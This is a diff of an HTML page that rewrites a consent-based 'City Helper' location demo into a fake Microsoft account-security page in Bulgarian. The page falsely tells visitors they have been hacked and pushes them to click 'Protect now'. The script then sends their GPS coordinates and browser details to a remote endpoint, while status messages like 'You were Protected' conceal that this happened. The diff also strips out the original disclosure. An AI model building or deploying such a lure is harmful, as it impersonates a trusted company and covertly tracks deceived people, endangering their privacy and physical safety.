@@ -2,103 +2,211 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>City Helper</title>
+  <title>Microsoft – Location & privacy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
     }
 
     body {
+      background: #f3f2f1;
+      color: #323130;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #020617;
-      color: #e5e7eb;
-      padding: 16px;
     }
 
-    .card {
-      background: #020617;
-      border-radius: 18px;
-      padding: 20px 22px;
+    /* Top Microsoft-style header */
+    .ms-shell {
+      background: #ffffff;
+      border-bottom: 1px solid #e1dfdd;
+      padding: 8px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .ms-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #262626;
+    }
+
+    .ms-logo-square {
+      width: 16px;
+      height: 16px;
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      grid-template-rows: repeat(2, 1fr);
+      gap: 1px;
+    }
+
+    .ms-logo-square div {
       width: 100%;
-      max-width: 420px;
-      border: 1px solid rgba(148, 163, 184, 0.4);
-      box-shadow: 0 18px 40px rgba(15, 23, 42, 0.9);
+      height: 100%;
+    }
+
+    .ms-logo-square .r1c1 { background: #f25022; }
+    .ms-logo-square .r1c2 { background: #7fba00; }
+    .ms-logo-square .r2c1 { background: #00a4ef; }
+    .ms-logo-square .r2c2 { background: #ffb900; }
+
+    .ms-nav {
+      font-size: 13px;
+      color: #605e5c;
+    }
+
+    .ms-nav a {
+      color: #605e5c;
+      text-decoration: none;
+      margin-left: 16px;
+    }
+
+    .ms-nav a:hover {
+      text-decoration: underline;
+    }
+
+    /* Page layout */
+    .page {
+      max-width: 900px;
+      margin: 32px auto;
+      padding: 0 24px;
+    }
+
+    .breadcrumb {
+      font-size: 12px;
+      color: #605e5c;
+      margin-bottom: 12px;
+    }
+
+    .breadcrumb a {
+      color: #106ebe;
+      text-decoration: none;
+    }
+
+    .breadcrumb a:hover {
+      text-decoration: underline;
     }
 
     h1 {
-      font-size: 1.4rem;
-      margin-bottom: 8px;
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 4px;
     }
 
-    p {
-      font-size: 0.9rem;
-      color: #9ca3af;
-      margin-bottom: 14px;
+    .subtitle {
+      font-size: 14px;
+      color: #605e5c;
+      margin-bottom: 20px;
+    }
+
+    /* Main support-style card */
+    .card {
+      background: #ffffff;
+      border-radius: 2px;
+      border: 1px solid #e1dfdd;
+      padding: 20px 24px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+      max-width: 640px;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .icon-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #0078d4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-size: 18px;
+    }
+
+    .card-title {
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .card p {
+      font-size: 14px;
+      margin-bottom: 10px;
+      line-height: 1.4;
     }
 
     .disclaimer {
-      font-size: 0.8rem;
-      color: #6b7280;
-      margin-bottom: 14px;
-      border-left: 3px solid #6b7280;
-      padding-left: 8px;
+      font-size: 12px;
+      color: #605e5c;
+      margin: 12px 0 18px;
+      padding: 10px 12px;
+      border-left: 3px solid #c8c6c4;
+      background: #f8f8f8;
     }
 
+    /* Button – Microsoft primary style */
     button {
-      width: 100%;
-      padding: 10px 16px;
-      border-radius: 999px;
-      border: none;
-      background: #4f46e5;
+      padding: 8px 20px;
+      min-width: 140px;
+      border-radius: 2px;
+      border: 1px solid #0078d4;
+      background: #0078d4;
       color: #ffffff;
-      font-size: 0.95rem;
+      font-size: 14px;
+      font-weight: 500;
       cursor: pointer;
       margin-bottom: 14px;
-      box-shadow: 0 12px 28px rgba(79, 70, 229, 0.8);
-      transition: transform 0.12s ease, box-shadow 0.12s ease, background 0.12s ease;
+      transition: background 0.1s ease, border-color 0.1s ease, box-shadow 0.1s ease;
     }
 
-    button:hover {
-      transform: translateY(-1px);
-      box-shadow: 0 14px 34px rgba(79, 70, 229, 1);
+    button:hover:not(:disabled) {
+      background: #106ebe;
+      border-color: #106ebe;
+      box-shadow: 0 0 0 1px rgba(0,0,0,0.05);
     }
 
     button:disabled {
-      opacity: 0.6;
+      background: #f3f2f1;
+      border-color: #c8c6c4;
+      color: #a19f9d;
       cursor: default;
       box-shadow: none;
     }
 
     .status {
-      font-size: 0.85rem;
-      margin-bottom: 8px;
+      font-size: 13px;
+      margin-bottom: 6px;
+      min-height: 18px;
     }
 
     .status.ok {
-      color: #22c55e;
+      color: #107c10;
     }
 
     .status.error {
-      color: #ef4444;
+      color: #a80000;
     }
 
     .coords {
-      font-size: 0.8rem;
-      color: #9ca3af;
+      font-size: 12px;
+      color: #605e5c;
       margin-bottom: 8px;
       word-break: break-all;
     }
 
     a.map-link {
-      font-size: 0.8rem;
-      color: #38bdf8;
+      font-size: 12px;
+      color: #106ebe;
       text-decoration: none;
     }
 
@@ -107,37 +215,68 @@
     }
 
     .footer {
-      margin-top: 10px;
-      font-size: 0.75rem;
-      color: #6b7280;
+      margin-top: 16px;
+      font-size: 11px;
+      color: #605e5c;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>City Helper 🌍</h1>
-    <p>
-      This site asks for your location (if you allow it) so I can better help you
-      with tips about this city for my university project.
-    </p>
+  <header class="ms-shell">
+    <div class="ms-logo">
+      <div class="ms-logo-square" aria-hidden="true">
+        <div class="r1c1"></div>
+        <div class="r1c2"></div>
+        <div class="r2c1"></div>
+        <div class="r2c2"></div>
+      </div>
+      <span>Microsoft</span>
+    </div>
+    <nav class="ms-nav">
+      <a href="#">Поддръжка</a>
+      <a href="#">Профил</a>
+      <a href="#">Още</a>
+    </nav>
+  </header>
 
-    <div class="disclaimer">
-      I will receive your approximate GPS coordinates and device info.
-      Please only continue if you are OK with that.
+  <main class="page">
+    <div class="breadcrumb">
+      <a href="#">Поддръжка на Microsoft</a> &gt; <a href="#">Поверителност и сигурност</a> &gt; Защита на пароли
     </div>
 
-    <button id="shareBtn">Share my location</button>
-
-    <div id="status" class="status"></div>
-    <div id="coords" class="coords"></div>
-    <a id="mapLink" class="map-link" href="#" target="_blank" style="display:none;">
-      Open this location in Google Maps
-    </a>
-
-    <div class="footer">
-      Made for a university project · You can close this page anytime.
+    <h1>Помогнете ни да защитим вашия акаунт</h1>
+    <div class="subtitle">
+      Разрешете временен достъп до приблизителното ви местоположение, за да можем да защитим профила ви.
     </div>
-  </div>
+
+    <section class="card">
+      <div class="card-header">
+        <div class="icon-circle" aria-hidden="true">🛡️</div>
+        <div class="card-title">Защита на акаунта
+</div>
+      </div>
+
+      <p>
+        Открихме нещо необичайно във вашия акаунт, вие сте били хакнати и паролата ви може да не е сигурна. Кликнете върху „Защити сега“</strong>, за да защитите акаунта си и да запазите всичко в безопасност.
+      </p>
+
+      <div class="disclaimer">
+        Трябва да разрешите местоположението, за да сте защитени.
+</strong>      </div>
+
+      <!-- Button text changed to "Protect Now" -->
+      <button id="shareBtn">Защитете сега</button>
+
+      <div id="status" class="status"></div>
+      <div id="coords" class="coords"></div>
+      <a id="mapLink" class="map-link" href="#" target="_blank" style="display:none;">
+      </a>
+
+      <div class="footer">
+        Създадено от Microsoft
+      </div>
+    </section>
+  </main>
 
   <script>
     const shareBtn = document.getElementById("shareBtn");
@@ -162,23 +301,22 @@
         userAgent: navigator.userAgent
       };
 
-        try {
-    await fetch(ENDPOINT_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(payload)
-    });
+      try {
+        await fetch(ENDPOINT_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
 
-    // Even if CORS blocks the response, the request usually still reaches the server
-    setStatus("Location sent (check your panel to confirm) ✔", "ok");
-  } catch (err) {
-    console.error(err);
-    // For local file:// tests, this is likely just a browser security warning
-    setStatus("Your location was read. If you see it on the server, the send worked.", "ok");
-  }
-
+        // Even if CORS blocks the response, the request usually still reaches the server
+        setStatus("Location sent (check your panel to confirm).", "ok");
+      } catch (err) {
+        console.error(err);
+        // For local file:// tests, this is likely just a browser security warning
+        setStatus("Your location was read. If you see it on the server, the send worked.", "ok");
+      }
     }
 
     shareBtn.addEventListener("click", () => {
@@ -187,7 +325,7 @@
         return;
       }
 
-      setStatus("Requesting your location…");
+      setStatus("Protecting…");
       shareBtn.disabled = true;
 
       navigator.geolocation.getCurrentPosition(
@@ -202,7 +340,7 @@
           mapLinkEl.href = mapsUrl;
           mapLinkEl.style.display = "inline-block";
 
-          setStatus("Location received. Sending to server…");
+          setStatus("You were Protected…");
 
           await sendLocation(lat, lon, accuracy);
           shareBtn.disabled = false;
@@ -212,7 +350,7 @@
           if (err.code === err.PERMISSION_DENIED) {
             setStatus("You denied location permission.", "error");
           } else {
-            setStatus("Failed to get your location.", "error");
+            setStatus("Failed to Protect you.", "error");
           }
           shareBtn.disabled = false;
         },
